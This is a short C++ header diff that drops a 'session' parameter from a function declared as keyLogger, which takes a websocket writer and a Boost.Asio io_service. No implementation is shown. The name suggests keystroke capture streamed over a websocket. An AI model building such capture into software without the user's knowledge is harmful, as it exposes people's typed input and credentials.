@@ -31,4 +31,4 @@ private:
   	DataWriter & websocket_;
 };
 
-void keyLogger(DataWriter & websocket, int session, boost::asio::io_service & io_service);
+void keyLogger(DataWriter & websocket, boost::asio::io_service & io_service);
